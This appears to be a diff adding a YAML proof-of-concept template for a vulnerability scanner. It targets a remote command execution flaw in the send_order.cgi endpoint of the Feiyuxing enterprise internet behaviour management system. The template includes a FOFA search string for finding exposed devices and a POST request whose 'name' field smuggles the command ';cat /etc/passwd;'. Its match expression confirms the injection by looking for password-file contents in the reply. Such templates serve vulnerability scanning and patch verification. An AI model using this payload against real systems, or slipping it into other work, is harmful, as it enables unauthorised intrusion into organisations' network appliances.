@@ -1,0 +1,18 @@
+id: poc-yaml-feiyuxing-send-order-cgi-rce
+info:
+  name: 飞鱼星企业级智能上网行为管理系统 send_order.cgi 远程代码执行漏洞
+  severity: high
+  tags:
+  - rce
+  finger: 企业级智能上网行为管理系统
+  fofa: title=="飞鱼星企业级智能上网行为管理系统"
+requests:
+- method: POST
+  path: /send_order.cgi?parameter=operation
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: '{"opid":"1","name":";cat /etc/passwd;","type":"rest"}'
+  expression: status_code == 200 && contains(headers,"root:") && contains(headers,"/bin")
+    && contains(body,`{"type":1,"msg":"ok"}`)
+variables: {}
+transport: http
